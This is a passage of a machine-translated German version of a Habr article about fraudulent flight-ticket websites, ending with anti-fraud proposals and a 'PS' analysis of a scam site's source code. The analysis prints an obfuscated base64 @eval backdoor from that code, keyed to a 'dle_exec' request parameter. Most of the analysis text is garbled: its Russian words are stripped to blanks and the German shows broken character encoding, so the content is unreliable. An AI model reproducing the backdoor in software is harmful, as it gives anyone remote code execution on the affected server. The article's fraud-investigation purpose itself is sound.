Da sich hinter jeder betrÃ¼gerischen Website fÃ¼r den Verkauf von Flugtickets eine separate Person befindet, die den Quellcode der Website kostengÃ¼nstig gekauft hat, kÃ¶nnen Sie in jedem Fall die verantwortliche Person finden, und dies muss getan werden. Nicht jeder Administrator einer solchen gefÃ¤lschten Website ist ein Superprofi, dessen Spuren nicht gefunden werden kÃ¶nnen. Ich bin sicher, dass es unter solchen Admins genug gibt, die geerbt haben und, wenn sie die entsprechende AutoritÃ¤t haben, berechnet werden kÃ¶nnen. Aber meiner Meinung nach sollten Sie, anstatt zu versuchen, mit jeder gefÃ¤lschten Site einzeln umzugehen, auf die Sites achten, auf denen die Quellen solcher gefÃ¤lschten Sites frei verteilt sind.</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Um betrÃ¼gerischen Websites, die gefÃ¤lschte Flugtickets verkaufen, einen vernichtenden Schlag zu versetzen, brauchen Sie nicht so viel. Wenn jeder ein wenig tut, wird dies das Leben von BetrÃ¼gern erheblich verkomplizieren und die Frage nach der Ineffizienz der FÃ¼hrung eines solchen GeschÃ¤fts aufwerfen. Suchmaschinen mÃ¼ssen ein wenig aufpassen, um zu verhindern, dass solche Websites in Anzeigen gelangen. Es ist unrealistisch, solche Websites ohne Werbung in die Top-SERPs zu unterteilen. AuÃŸerdem sollten Suchmaschinen Websites ausschlieÃŸen, die tatsÃ¤chlich kriminelle Systeme kaufen und verkaufen. Die Banken mÃ¼ssen ein wenig auf ihre Zahlungsdienste achten, damit BetrÃ¼ger sie nicht einfach nutzen kÃ¶nnen. Brauchen Sie ein wenig Aufmerksamkeit von den Gastgebern. Sie benÃ¶tigen ein wenig Aufmerksamkeit von Zahlungssystemen. Lassen Sie zunÃ¤chst keine Zahlungen zu, ohne 3D Secure zu Ã¼berprÃ¼fen (wie im ersten Teil der VerÃ¶ffentlichung gezeigt).es ist noch mÃ¶glich). Brauchen Sie etwas Aufmerksamkeit von den StrafverfolgungsbehÃ¶rden. Anstatt jeden Fall von Gelddiebstahl zu untersuchen, ist es effektiver, im Voraus zu handeln - um mit dem Nest umzugehen, in dem die BetrÃ¼ger kommunizieren (analysieren Sie beispielsweise genau diese Schattenforen). Und natÃ¼rlich brauchen Sie ein wenig Aufmerksamkeit von den potenziellen KÃ¤ufern von Flugtickets selbst.</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Sie sagen, dass Reparaturen nicht abgeschlossen werden kÃ¶nnen und nur gestoppt werden kÃ¶nnen. </font><font style="vertical-align: inherit;">Diese VerÃ¶ffentlichung ist ein Ã¤hnlicher Fall. </font><font style="vertical-align: inherit;">Obwohl noch viel mehr geschrieben werden kÃ¶nnte, werde ich hier aufhÃ¶ren. </font><font style="vertical-align: inherit;">Vielen Dank fÃ¼r Ihre Aufmerksamkeit. </font><font style="vertical-align: inherit;">Ich freue mich Ã¼ber Ihre Kommentare.</font></font><br>
<br>
<div class="spoiler"><b class="spoiler_title"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PS Ãœber Jackie Chan ... Sie kÃ¶nnen nicht lesen</font></font></b><div class="spoiler_text">      ,       ,           ,    ,      .<br>
<br>
          ,       , ,   ,     - .      .        .<br>
<br>
<div class="spoiler"><b class="spoiler_title"> </b><div class="spoiler_text">   fon.png.    ,   ,  .    (merch)    .    .<br>
<br>
           . , -      ,    .    .        .<br>
<img src="https://habrastorage.org/files/d79/ff7/9c4/d79ff79c458d4bd9ad5c15987f410a8b.png"><br>
<br>
         VISA  Mastercard     (logo_standart_ru.png):<br>
<br>
<img src="https://habrastorage.org/files/596/f44/183/596f4418373846908dcede64835821c4.png"><br>
<br>
    .   , .<br>
</div></div><br>
<div class="spoiler"><b class="spoiler_title">       parser.php</b><div class="spoiler_text"><img src="https://habrastorage.org/files/0a9/dd4/b36/0a9dd4b36e6b45ed9aa6f5584dc2adec.png"><br>
<br>
     .<br>
</div></div><br>
<div class="spoiler"><b class="spoiler_title">  </b><div class="spoiler_text">    ,   ,   ,    - . ,    -,      Â«Â» .  (config.php)     ,  .                .     .     .          .<br>
<br>
<img src="https://habrastorage.org/files/65d/4e6/484/65d4e6484eca40468fdab34568130804.png"><br>
<br>
<pre><code class="php hljs"><span class="hljs-string"><span class="hljs-string">'.@evalbase64_dec&amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;#111;deDQppZihpc3NldCgkX1JFUVVFU1RbImRsZV9leGVjIl0pKXsNCglAZXZhbCgkX1JFUVVFU1RbImRsZV9leGVjIl0pOw0KCWV4aXQ7DQp9LyoqLw0K.//456'</span></span> =&gt; <span class="hljs-string"><span class="hljs-string">'qwe'</span></span>,<font></font>
<font></font>
<span class="hljs-string"><span class="hljs-string">'.@evalbase64_dec&amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;#111;deDQppZihpc3NldCgkX1JFUVVFU1RbImRsZV9leGVjIl0pKXsNCglAZXZhbCgkX1JFUVVFU1RbImRsZV9leGVjIl0pOw0KCWV4aXQ7DQp9LyoqLw0K.//456'</span></span> =&gt; <span class="hljs-string"><span class="hljs-string">'qwe'</span></span>,
</code></pre></div></div><br>
<div class="spoiler"><b class="spoiler_title"> .       </b><div class="spoiler_text"><img src="https://habrastorage.org/files/d28/976/6b8/d289766b88b640119c267f7721f8be25.png"><br>
<br>
     ,      ,  ,  Â«Â»      .<br>
</div></div><br>
<div class="spoiler"><b class="spoiler_title">     email  </b><div class="spoiler_text">     ,  EMAIL.  :<br>
<br>
<img src="https://habrastorage.org/files/8f5/996/3a5/8f59963a5d8c493aa4a38a90c911b92b.png"> <br>
       3ds.payment.ru       <code>Lakhtin@psbank.ru</code>.<br>
<br>
 ,      ? ,    - . , ,     Mastercard     3DS.<br>
<br>
<code>https://www.mastercard.us/content/dam/mccom/en-us/documents/SecureCode%20Vendor%20list/3ds-vendor-list-042215.pdf</code><br>
<br>
<div class="spoiler"><b class="spoiler_title">         Mastercard</b><div class="spoiler_text"><img src="https://habrastorage.org/files/568/5a5/70f/5685a570faf943c191ab61e9927b5e17.png"><br>
</div></div><br>
 email            .      -      .      -         . ..  - ,      ,     ,      - .<br>
<br>
  ,   email      ?     . ,  -,        .          ,     .            .     ,           ,   -   -   ,     ,      .<br>
<br>
          . , - -   email    .  ,   ,              .   ,       .   ,    ,        ,           .       -  , ,   ,  email  -,    -           . (,       ,    ..     ).      ,     .. .     .  ,          -,      .  ,       ,      ,      ,    .          .     ,     -, ,           .         , ,   ,     ,     . <br>
<br>
       ?         ,     .  email  , , .     .   -  ,     -   ,        .</div></div><br>
<div class="spoiler"><b class="spoiler_title">   ?</b><div class="spoiler_text">    ,     , Â«Â»   3ds.payment.ru,    .    ,          LaravelRUS    ,      Curl   3ds.payment.ru. <br>
<br>
     ,      .       ?   ?  ?<br>
 ,          ,     .<br>
<br>
<img src="https://habrastorage.org/files/51b/341/bd4/51b341bd4e9143a3b9c41fbf5288e33e.png"><br>
<br>
<img src="https://habrastorage.org/files/aac/503/90c/aac50390ca644df2a8ce9de00bc2425a.png"><br>
<br>
<img src="https://habrastorage.org/files/5e0/1f8/d30/5e01f8d302c14d229d64f7b0b52a2112.png"><br>
<br>
      .   . -    .<br>
<br>
<img src="https://habrastorage.org/files/8ee/d73/b76/8eed73b765f94a1ba8de070278a3d8df.png"><br>
<br>
 :<br>
<br>
Â» <code>https://gitter.im/LaravelRUS/chat/archives/2016/05/06</code> â€”      .       .<br>
Â» <code>http://gitchat.org/developers/Valtas</code> â€”     <br>
Â» <code>https://github.com/Valtas</code> â€”    Github<br>
Â» <code>https://www.fl.ru/tu/57770/parser-internet-magazina.html -   .</code><br>
<br>
       ,  ,     â€”      .<br>
</div></div><br>
<div class="spoiler"><b class="spoiler_title">      </b><div class="spoiler_text">  ,        .       ,      .          ,   .<br>
<br>
<a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">http://forum.prootzyvy.org/forums/spisok-sajtov-moshennikov-po-prodazhe-aviabiletov.134/</a><br>
<br>
    336 .           ,     .      .<br>
<br>
<div class="spoiler"><b class="spoiler_title">        </b><div class="spoiler_text"><img src="https://habrastorage.org/files/ca0/31e/669/ca031e669c344a2fad4af30380977d80.png"><br>
</div></div><br>
        ?   ,     .   .    ,   .                  ,  ,  ,    ..      ,    .        ,   ,     .   ,     -   Â« Â»         .     (     ).     - 5-10-20     ..   ,   ,        ,    .    (),  ,    ,     .<br>
</div></div><br>
<div class="spoiler"><b class="spoiler_title">.     ?</b><div class="spoiler_text">               .        .           ,     .      ,      .          Â«.  Â».    ,                 .      ,            .               .   .         .<br>
<br>
       ,        ,   . ,   ,      -,        .    ,     .    ,   ,          . <br>
<br>
       ,     .    ,       . ,              .<br>
</div></div><br>
<div class="spoiler"><b class="spoiler_title"> </b><div class="spoiler_text">         ,             ,           .     -   -     .       .       ,    .<br>
<br>
<img src="https://habrastorage.org/files/cfb/9df/65c/cfb9df65c6d34e2ea70ee2d078901119.png"><br>
<br>
  80   ,          .    ,    .        ,  .     :<br>
<br>
<img src="https://habrastorage.org/files/7f7/05b/2eb/7f705b2ebb5d4b5bb19bc37eeb6e7c16.png"><br>
<br>
     56      , Â« Â»,     ,    . <br>
     ,   ,  Â« Â»,     ,     .<br>
<br>
       :<br>
<br>
<img src="https://habrastorage.org/files/6f8/ef9/849/6f8ef98493bc40c1949431241c59d0a0.png"><br>
<br>
<img src="https://habrastorage.org/files/52f/15a/2ea/52f15a2eaf94401baf1a7995169b2470.png"><br>
<br>
     -  -.          ,     .   ,          .     .  ,     .    ,          ,   ,  . <br>
</div></div><br>
</div></div></div>
      
    </div><p>Source: <a rel="nofollow" href="https://habr.com/ru/post/de398313/">https://habr.com/ru/post/de398313/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../de398301/index.html">Smart Home oder Spielzeug fÃ¼r MÃ¤nner: Temperaturregelung</a></li>
<li><a href="../de398303/index.html">Siebenhundertstes Ideapad - ÃœberprÃ¼fung der Gaming-Laptop-Y-Serie</a></li>
<li><a href="../de398305/index.html">Die Ãœbersetzung des zweiten Buches aus der Reihe â€Erinnerung an die Vergangenheit der Erdeâ€œ, â€Dunkler Waldâ€œ, ist abgeschlossen. Viel SpaÃŸ beim Lesen</a></li>
<li><a href="../de398309/index.html">Probleme der modernen Robotik 2 oder wie Spiele die Welt retten ...</a></li>
<li><a href="../de398311/index.html">Manuelle mechanische Tentakel zu Hause: Teil 2, Kabelmanagement</a></li>
<li><a href="../de398315/index.html">Wie nehmen Photonen die Zeit wahr?</a></li>
<li><a href="../de398317/index.html">House-with-Mind oder Automatisierung aus der Box</a></li>
<li><a href="../de398319/index.html">Bart Knolls - Ein kompromissloser MÃ¼ckenvernichter</a></li>
<li><a href="../de398321/index.html">Kindred tÃ¶ten - Eine veraltete Evolutionsstrategie</a></li>
<li><a href="../de398323/index.html">Sprecher von Videospielen bereiten sich auf einen Streik fÃ¼r Entwickler vor</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter57283870 = new Ya.Metrika({
                  id:57283870,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/57283870" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134228602-6', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

<footer class="page-footer">
  <div class="page-footer-legal-info-container page-footer-element">
    <p>
      Weekly-Geekly ES | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
    </p>
  </div>
  <div class="page-footer-counters-container page-footer-element">
    <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=9uU9J9pq8z7k8xEBHYSfs6DenIBAHs3vLIHcPIJW9d0&co=3a3a3a&ct=ffffff'/></a>
  </div>
</footer>
  
</body>

</html>